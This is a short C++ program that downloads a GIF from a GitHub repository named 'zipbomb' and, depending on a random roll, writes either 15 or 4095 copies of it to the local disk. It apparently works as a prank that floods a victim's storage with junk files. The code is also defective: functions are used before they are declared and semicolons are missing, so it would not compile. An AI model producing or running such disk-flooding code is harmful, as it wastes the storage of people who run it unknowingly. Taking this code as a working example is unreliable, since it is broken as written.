#include <random>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <curl/curl.h>

int bigFile() {
    downloadFile("https://raw.githubusercontent.com/bean91/zipbomb/main/rip-ezgif.com-added-text.gif", "hehe.gif") 
    duplicateFile("hehe.gif", 4095);
    return 0;
}

int smolFile() {
    downloadFile("https://raw.githubusercontent.com/bean91/zipbomb/main/rip-ezgif.com-added-text.gif", "hehe.gif") 
    duplicateFile("hehe.gif", 15);
    return 0;
}

using namespace std;
namespace fs = std::filesystem;

size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    return fwrite(ptr, size, nmemb, stream);
}

bool downloadFile(const string& url, const string& outputFilename) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    FILE* fp = fopen(outputFilename.c_str(), "wb");
    if (!fp) return false;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    fclose(fp);

    return res == CURLE_OK;
}

void duplicateFile(const string& source, int copies) {
    for (int i = 1; i <= copies; ++i) {
        string dest = "copy_" + to_string(i) + ".gif";
        fs::copy_file(source, dest, fs::copy_options::overwrite_existing);
    }
}

int main() {
    string url = "https://raw.githubusercontent.com/bean91/zipbomb/main/rip-ezgif.com-added-text.gif";
    string filename = "hehe.gif";
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(0, 99);
    int randomNumber = distrib(gen);
    cout << randomNumber << endl;
    if (randomNumber == 99) {
        bigFile();
    } else {
        smolFile();
    }
    return 0;
}
